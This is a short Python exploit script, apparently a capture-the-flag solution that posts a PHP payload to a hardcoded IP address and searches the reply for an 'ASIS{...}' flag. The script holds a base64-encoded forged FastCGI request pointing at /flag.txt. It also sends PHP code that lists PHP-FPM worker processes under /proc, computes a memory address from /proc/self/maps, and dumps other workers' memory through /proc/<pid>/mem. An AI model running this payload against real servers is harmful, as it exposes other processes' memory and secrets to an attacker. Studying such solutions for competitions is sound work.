#!/usr/bin/env python3
import requests
# 
b64 = 'AQH15AAIAAAAAQAAAAAAAAEE9eQBiQAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPDlNDUklQVF9GSUxFTkFNRS93ZWIvaW5kZXgucGhwCwpTQ1JJUFRfTkFNRS9pbmRleC5waHAMAFFVRVJZX1NUUklORwsKUkVRVUVTVF9VUkkvaW5kZXgucGhwDQVET0NVTUVOVF9ST09UL3dlYi8RCVJFUVVFU1RfQk9EWV9GSUxFL2ZsYWcudHh0Dw5TRVJWRVJfU09GVFdBUkVwaHAvZmNnaWNsaWVudAsJUkVNT1RFX0FERFIxMjcuMC4wLjELBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX0FERFIxMjcuMC4wLjELAlNFUlZFUl9QT1JUODALCVNFUlZFUl9OQU1FbG9jYWxob3N0DwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dA4EQ09OVEVOVF9MRU5HVEgxMDAwAQT15AAAAAABBfXkAAMAAEFBQQEF9eQAAAAA'
data = """
$listOfProc = array_reverse(scandir('/proc/'));
$procs = [];
foreach($listOfProc as $p){
	if(is_numeric($p)){
		if(str_contains(file_get_contents('/proc/'.$p.'/cmdline'),'pool www')){
			array_push($procs,intval($p));
		}
	}
}
$maps = file_get_contents("/proc/self/maps");
$d = getmypid();
$base = hexdec(explode("-",file_get_contents("/proc/self/maps"))[0]);
#
$addr = unpack("P",file_get_contents("/proc/self/mem",false,null,$base+0x14212c8,0x8))[1]+0x47ad8-0x40-0x10000;
$d = getmypid();
for($i=0;$i<10000;$i+=1){
	for($g=0;$g<5;$g += 1){
		if($procs[$g] != $d){
			echo file_get_contents("/proc/".($procs[$g])."/mem",false,null,$addr,0x20000);
		}
	}
}
echo 'exited';
__halt_compiler();
""".strip()

r = requests.post('http://65.109.135.249:3000',data={'y':data})
import re
# print(r.text)
print(re.findall(r"ASIS{.*?}",r.text))


